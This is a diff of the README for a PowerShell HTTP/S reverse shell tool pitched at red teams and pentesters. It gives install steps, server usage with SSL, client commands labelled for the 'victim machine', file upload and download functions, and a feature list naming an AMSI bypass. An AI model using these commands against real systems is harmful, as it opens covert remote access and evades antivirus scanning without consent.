@@ -1,29 +1,49 @@
-# Powershell HTTP/S Reverse Shell
-HTTP-revshell is a tool focused on redteam exercises and pentesters. This tool provides a reverse connection through the http/s protocol.
+Powershell HTTP/S Reverse Shell
+------------
 
-##  server.py - server
+HTTP-revshell is a tool focused on redteam exercises and pentesters. This tool provides a reverse connection through the http/s protocol.
 
 ![Alt text](images/revshell.jpg "Server")
 
-On the attacker machine:
-```
-    python3 server.py IP PORT
-    
-    For SSL Reverse Shell:
-        openssl genrsa -out private.pem 2048
-        openssl req -new -x509 -key private.pem -out cacert.pem -days 9999
-        python3 server.py --ssl IP PORT
+Installation
+------------
+
+```shell
+git clone https://github.com/3v4Si0N/HTTP-revshell.git
+cd HTTP-revshell/
+pip3 install -r requirements.txt
 ```
 
-## Invoke-WebRev.ps1 - client
+server.py - server unisession
+------------
 
-On the victim machine:
+Server usage:
+```
+usage: server.py [-h] [--ssl] host port
+
+Process some integers.
+
+positional arguments:
+  host        Listen Host
+  port        Listen Port
+
+optional arguments:
+  -h, --help  show this help message and exit
+  --ssl       Send traffic over ssl
+```
+
+Invoke-WebRev.ps1 - client
+------------
+
+Client usage:
 ```
 Import-Module .\Invoke-WebRev.ps1
 Invoke-WebRev -ip IP -port PORT [-ssl]
 ```
 
-# Extra functions
+Extra functions
+------------
+
 ```
 Upload
     Usage: upload /src/path/file C:\dest\path\file
@@ -34,7 +54,9 @@ Download
     Usage: download C:\src\path\file /dst/path/file
 ```
 
-# Features
+Features
+------------
+
     - SSL
     - Proxy Aware
     - Upload Function
@@ -42,7 +64,8 @@ Download
     - Error Control
     - AMSI bypass
 
-# TODO
+TODO
+------------
+
+    - Multiple sessions (only server-multisession.py)
     - Autocomplete
-    - Multiple sessions
-    
